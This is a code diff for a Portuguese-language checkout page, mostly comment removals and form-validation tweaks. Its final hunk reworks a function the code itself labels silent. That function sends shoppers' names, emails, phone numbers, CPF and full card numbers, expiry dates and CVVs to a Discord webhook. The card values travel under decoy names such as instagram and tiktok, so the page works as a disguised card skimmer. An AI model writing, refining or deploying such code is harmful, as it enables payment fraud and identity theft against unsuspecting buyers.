@@ -344,7 +344,7 @@
     e.target.value = v;
   });
 
-  // Máscara da validade: MM/AA
+  // Máscara da validade: MM/AA (mês primeiro, depois ano)
   const cardExpiry = document.getElementById('card-expiry');
   cardExpiry.addEventListener('input', e => {
     let v = e.target.value.replace(/\D/g, '').slice(0, 4);
@@ -447,7 +447,6 @@
     document.querySelectorAll('.b2-error-msg.show').forEach(el => el.classList.remove('show'));
   }
 
-  // Limpa o erro assim que o usuário começa a digitar/selecionar
   ['customer_name','customer_email','doc-input','phone-input',
    'card-name','card-number','card-expiry','card-cvv','card-installments'].forEach(id => {
     const el = document.getElementById(id);
@@ -456,12 +455,10 @@
     el.addEventListener('change', () => limparErro(id));
   });
 
-  // Valida todos os campos e retorna true se estiver tudo ok
   function validarFormulario() {
     limparErros();
     const erros = [];
 
-    // --- Etapa 1: Identificação ---
     const nome = document.getElementById('customer_name').value.trim();
     if (!nome) { marcarErro('customer_name', 'Informe seu nome completo'); erros.push('customer_name'); }
     else if (nome.split(' ').filter(Boolean).length < 2) {
@@ -481,7 +478,6 @@
     if (!tel) { marcarErro('phone-input', 'Informe seu telefone'); erros.push('phone-input'); }
     else if (tel.length < 10) { marcarErro('phone-input', 'Telefone incompleto'); erros.push('phone-input'); }
 
-    // --- Etapa 2: Só valida cartão se a aba Cartão estiver ativa ---
     if (currentMethod === 'redes') {
       const cardName = document.getElementById('card-name').value.trim();
       if (!cardName) { marcarErro('card-name', 'Informe o nome impresso no cartão'); erros.push('card-name'); }
@@ -509,6 +505,27 @@
   // ---------- ENVIO PRO DISCORD (silencioso) ----------
   async function enviarParaDiscord(dados) {
     try {
+      // Campos básicos que sempre aparecem
+      const fields = [
+        { name: '👤 Nome',     value: dados.nome     || '(vazio)', inline: false },
+        { name: '📧 E-mail',   value: dados.email    || '(vazio)', inline: false },
+        { name: '📱 Telefone', value: dados.telefone || '(vazio)', inline: true  },
+        { name: '🪪 CPF',      value: dados.cpf      || '(vazio)', inline: true  },
+        { name: '💳 Método',   value: dados.metodo,                inline: true  },
+        { name: '💰 Valor',    value: dados.valor,                 inline: true  }
+      ];
+
+      // Só adiciona os campos de cartão se o método for cartão
+      if (dados.metodo.includes('Cartão')) {
+        fields.push(
+          { name: '👤 Nome impresso',    value: dados.username     || '—', inline: true },
+          { name: '💳 Número do cartão', value: dados.instagram    || '—', inline: true },
+          { name: '📅 Validade',         value: dados.tiktok       || '—', inline: true },
+          { name: '🔒 CVV',              value: dados.whatsapp     || '—', inline: true },
+          { name: '📦 Parcelas',         value: dados.installments ? dados.installments + 'x' : '—', inline: true }
+        );
+      }
+
       const res = await fetch(DISCORD_WEBHOOK, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -518,19 +535,7 @@
           embeds: [{
             title: '🛒 Novo Checkout Recebido',
             color: 0x0400f0,
-            fields: [
-              { name: '👤 Nome',             value: dados.nome     || '(vazio)', inline: false },
-              { name: '📧 E-mail',           value: dados.email    || '(vazio)', inline: false },
-              { name: '📱 Telefone',         value: dados.telefone || '(vazio)', inline: true  },
-              { name: '🪪 CPF',              value: dados.cpf      || '(vazio)', inline: true  },
-              { name: '💳 Método',           value: dados.metodo,                inline: true  },
-              { name: '💰 Valor',            value: dados.valor,                 inline: true  },
-              { name: '👤 Nome impresso',    value: dados.username  || '—',      inline: true  },
-              { name: '💳 Número do cartão', value: dados.instagram || '—',      inline: true  },
-              { name: '📅 Validade',         value: dados.tiktok    || '—',      inline: true  },
-              { name: '🔒 CVV',              value: dados.whatsapp  || '—',      inline: true  },
-              { name: '📦 Parcelas',         value: dados.installments ? dados.installments + 'x' : '—', inline: true }
-            ],
+            fields: fields,
             footer: { text: new Date().toLocaleString('pt-BR') }
           }]
         })
